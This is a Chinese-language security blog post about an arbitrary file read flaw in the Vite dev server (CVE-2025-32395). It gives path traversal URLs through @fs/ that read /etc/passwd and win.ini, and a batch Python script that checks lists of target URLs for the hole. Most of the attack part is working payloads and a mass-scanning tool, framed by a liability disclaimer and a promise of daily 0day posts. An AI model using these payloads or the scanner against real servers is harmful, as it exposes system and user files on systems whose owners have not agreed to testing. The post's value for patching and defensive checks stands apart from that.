#  开发者注意！Vite框架曝高危漏洞，你的项目受影响了吗？（含poc和批量脚本）   
原创 淮橘安全  淮橘安全   2025-04-17 02:23  
  
# 声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，淮橘安全及文章作者不为此承担任何责任。  
  
  
现在只对常读和星标的公众号才展示大图推送，建议大家能把  
“  
**设为星标**  
”，  
否则可能就看不到了啦  
！每日为大家推送0day，1day，好用的工具供大家学习  
  
  
  
**0x01 漏洞描述**  
  
  
      近日，Vite框架曝出了一项高危漏洞——**CVE-2025-32395**  
，该漏洞可能导致**任意文件读取**  
，对广大开发者而言，带来不小的安全隐患。作为广受欢迎的前端构建工具，Vite的这个漏洞需要引起开发者的高度关注，尤其是在项目中使用Vite框架的开发者。                                                                                                                                                                                                                                                   
  
  
**0x02 漏洞原理**  
  
  
该漏洞源于Vite框架中正则表达式的缺陷，具体表现为在处理URL参数时，未对路径进行充分的安全性检查，攻击者可以利用这一缺陷，通过构造特殊的路径绕过安全控制，读取系统中的任意文件。  
  
攻击者通过发送特制的请求，访问Vite服务中的路径，如 @fs/  
，即可绕过安全防护，访问本应受限的系统文件。比如，攻击者可以通过访问以下路径：  
```
http://localhost:5173/@fs/root/pseudocat/#/../../../../../etc/passwd
```  
  
来读取服务器上的敏感文件 passwd  
，暴露系统中的用户信息。**这意味着攻击者能够窃取到系统内的关键信息，甚至完全掌控服务器。**  
  
**0x03 漏洞复现**  
  
  
**1、环境搭建：首先，确保你的Vite框架版本未更新至最新版本（未修复漏洞的版本）。可以通过以下命令来搭建Vite开发环境：**  
```
npm init vite@latest
# 选择框架并安装依赖
npm install
npm run dev
```  
  
**2、漏洞复现：启动本地开发服务器后，构造以下特定的请求：**  
  
**windows：**  
```
http://localhost:5173/@fs/root/pseudocat/#/../../../../../C://windows/win.ini
```  
  
**linux：**  
```
http://localhost:5173/@fs/root/pseudocat/#/../../../../../etc/passwd
```  
  
****  
**0x04 批量检测POC**  
  
使用方法：  
```
  -h, --help            show this help message and exit
  -u URL, --url URL     单个URL进行检测
  -f FILE, --file FILE  从文件中读取URL进行批量检测
```  
  
python脚本  
```
import requests
import argparse
# 检查漏洞的函数
def check_vulnerability(url):
    vulnerable_path = "/@fs/etc/passwd"  # 漏洞路径
    test_url = f"{url}{vulnerable_path}"
    try:
        response = requests.get(test_url)
        # 如果返回的状态码是200且包含敏感信息（如/etc/passwd内容），则漏洞存在
        if response.status_code == 200 and "root" in response.text:
            print(f"[漏洞检测成功] {test_url} 存在漏洞！")
        else:
            print(f"[漏洞检测失败] {test_url} 没有发现漏洞。")
    except requests.exceptions.RequestException as e:
        print(f"[错误] 请求失败: {e}")
# 从文件中读取URL并检测漏洞
def check_from_file(file_path):
    try:
        with open(file_path, 'r') as f:
            urls = f.readlines()
            urls = [url.strip() for url in urls if url.strip()]  # 去掉空行
        for url in urls:
            check_vulnerability(url)
    except FileNotFoundError:
        print(f"[错误] 文件 {file_path} 未找到！")
# 解析命令行参数
def parse_args():
    parser = argparse.ArgumentParser(description="批量检测Vite框架漏洞（CVE-2025-32395）")
    parser.add_argument("-u", "--url", help="单个URL进行检测", type=str)
    parser.add_argument("-f", "--file", help="从文件中读取URL进行批量检测", type=str)
    return parser.parse_args()
# 主函数
def main():
    args = parse_args()
    if args.url:
        check_vulnerability(args.url)
    elif args.file:
        check_from_file(args.file)
    else:
        print("[错误] 请提供 URL 或文件进行检测。")
        print("使用 -h 查看帮助信息。")
if __name__ == "__main__":
    main()
```  
  
  
  
